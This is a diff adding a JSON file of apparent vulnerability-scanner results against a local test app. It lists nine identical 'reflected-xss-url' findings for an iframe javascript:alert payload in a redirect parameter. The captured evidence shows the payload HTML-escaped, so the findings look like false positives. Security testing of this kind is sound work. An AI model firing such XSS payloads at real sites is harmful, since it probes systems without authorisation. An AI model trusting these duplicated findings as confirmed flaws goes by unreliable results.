@@ -1,0 +1,65 @@
+[
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    },
+    {
+        "url": "http://localhost:3000/redirect?to=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E",
+        "parameter": "to",
+        "payload": "<iframe src=javascript:alert(1)>",
+        "type": "reflected-xss-url",
+        "evidence": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unrecognized target URL for redirect: &lt;iframe src=javascript:alert(1)&gt;</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));\n  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);\n  background-repeat: no-repeat;\n  color: #555;\n  -webk"
+    }
+]
